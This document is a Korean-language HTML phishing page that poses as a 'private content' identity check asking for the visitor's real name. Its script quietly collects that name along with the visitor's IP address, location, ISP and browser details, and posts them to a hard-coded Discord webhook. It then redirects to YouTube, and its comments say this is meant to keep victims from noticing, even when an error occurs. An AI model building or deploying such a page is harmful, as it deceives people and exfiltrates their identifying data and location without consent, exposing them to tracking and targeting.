<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>콘텐츠 본인 인증</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 90%; max-width: 380px; text-align: center; padding: 40px 20px; border: 1px solid #eaeaea; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
        .icon { font-size: 50px; margin-bottom: 20px; }
        h2 { font-size: 20px; color: #333; margin-bottom: 10px; }
        p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.5; }
        input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; outline-color: #007AFF; }
        button { width: 100%; padding: 15px; background-color: #007AFF; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }
        button:hover { background-color: #0056b3; }
        .footer { font-size: 11px; color: #bbb; margin-top: 20px; }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">🔒</div>
    <h2>비공개 콘텐츠 보호</h2>
    <p>보안을 위해 <b>실명</b>을 입력하시면<br>해당 페이지로 즉시 연결됩니다.</p>
    
    <input type="text" id="target_name" placeholder="성함 입력" required>
    <button onclick="captureAndSend()">확인 및 입장</button>
    
    <div class="footer">SSL Secure Encryption Applied</div>
</div>

<script>
    async function captureAndSend() {
        const nameVal = document.getElementById('target_name').value;
        const webhook = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";

        if (!nameVal || nameVal.length < 2) {
            alert("이름을 정확히 입력해 주세요.");
            return;
        }

        try {
            // 1. IP 및 위치 정보 자동 수집
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();

            // 2. 디스코드 전송 (이름 + 자동수집 정보)
            await fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "👤 실명 기반 타겟 정보 보고서",
                        color: 3447003,
                        fields: [
                            { name: "📝 입력된 이름", value: `**${nameVal}**`, inline: false },
                            { name: "🌐 IP 주소", value: data.ip, inline: true },
                            { name: "📍 위치", value: `${data.city}, ${data.country_name}`, inline: true },
                            { name: "🏢 통신사", value: data.org || "알 수 없음" },
                            { name: "📱 기기 정보", value: navigator.userAgent }
                        ],
                        footer: { text: "Name Capture System Active" },
                        timestamp: new Date()
                    }]
                })
            });

            // 3. 성공한 척하고 유튜브로 이동
            location.href = "https://www.youtube.com";

        } catch (e) {
            // 에러 나도 눈치 못 채게 유튜브로 이동
            location.href = "https://www.youtube.com";
        }
    }
</script>

</body>
</html>
